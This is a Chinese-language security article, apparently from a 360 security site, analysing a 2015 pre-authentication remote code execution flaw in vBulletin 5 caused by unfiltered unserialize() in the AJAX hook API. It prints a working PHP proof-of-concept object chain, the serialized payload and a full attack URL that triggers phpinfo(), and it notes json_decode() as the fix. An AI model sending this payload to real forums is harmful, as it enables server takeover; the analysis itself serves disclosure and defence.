# vBulletin 5 远程命令执行（无需登录）#exp

阅读量 **114078**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-11-05 15:04:25

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

**vBulletin 是一个强大,灵活并可完全根据自己的需要定制的论坛程序套件。它使用目前发展速度最快的 Web 脚本语言编写:
PHP,并且基于以高效和疾速著称的数据库引擎 MySQL。**

****

vBulletin
是世界上用户非常广泛的PHP论坛,很多大型论坛都选择vBulletin作为自己的社区。vBulletin高效,稳定,安全,在中国也有很多大型客户,比如蜂鸟网,51团购,海洋部落等在线上万人的论坛都用vBulletin。

vBulletin的官方网站是 <http://www.vBulletin.com> 它不是免费软件,但价格很低。

一个叫Coldzer0的家伙在<http://0day.today>
贩卖vBulletin的RCE,并且在youtube上给出了视频演示,视频中他GOOGLE
dork了几个vBulletin论坛,进行利用。最后要说的是vBulletin主论坛也在周一(11/02/15)的时候被搞了。

vBulletin在/core/vb/api/实现ajax API调用,首先看看hook.php

    
    
       public function decodeArguments($arguments)
             {
                      if ($args = @unserialize($arguments))
                      {
                              $result = '';
                              foreach ($args AS $varname => $value)
                              {
                                       $result .= $varname;

显然unserialize没有经过任何过滤就进来了,我来找找他是在哪里调用的。在
/core/vb/db/result.php的vB_dB_Result类实现了一个迭代器

    
    
    {
    ...
             public function rewind()
             {
                      //no need to rerun the query if we are at the beginning of the recordset.
                      if ($this->bof)
                      {
                              return;
                      }
                      if ($this->recordset)
                      {
                              $this->db->free_result($this->recordset);
                      }

rewind()函数是在通过foreach()进行迭代器访问时被调用,接着来看看
/core/vb/database.php里的vB_Database抽象类中free_result()函数

    
    
    {
    ...    
             function free_result($queryresult)
             {
                      $this->sql = '';
                      return @$this->functions['free_result']($queryresult);
             }

这就形成了RCE

poc如下:

    
    
    $ php << 'eof'
    <?php
    class vB_Database {
           public $functions = array();
           public function __construct()
           {
                   $this->functions['free_result'] = 'phpinfo';
           }
    }
    class vB_dB_Result {
           protected $db;
           protected $recordset;
           public function __construct()
           {
                   $this->db = new vB_Database();
                   $this->recordset = 1;
           }
    }
    print urlencode(serialize(new vB_dB_Result())) . "n";
    eof

上面代码运行后返回

O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bi%3A1%3B%7D

然后针对目标请求

[http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D](http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D)

就可以看到phpinfo()信息了

**修复方式是使用json_decode()来替代unserialize(),不过话说这个漏洞地下流传已经超过3年了**

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360网络攻防实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82861](/post/id/82861)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg)
360网络攻防实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

